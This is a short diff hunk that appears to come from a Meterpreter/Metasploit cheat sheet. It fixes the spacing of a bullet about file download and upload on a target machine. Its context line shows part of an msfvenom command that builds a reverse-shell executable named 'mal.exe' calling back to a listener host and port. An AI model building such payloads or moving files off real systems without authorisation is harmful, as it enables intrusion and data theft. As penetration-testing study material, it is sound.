@@ -147,7 +147,7 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
 
     - `cat` : Display the contents of a file on screen
 
-    -`download / upload` : Move files to/from the target machine
+    - `download / upload` : Move files to/from the target machine
 
     - `mkdir / rmdir` : Make / remove directory
 
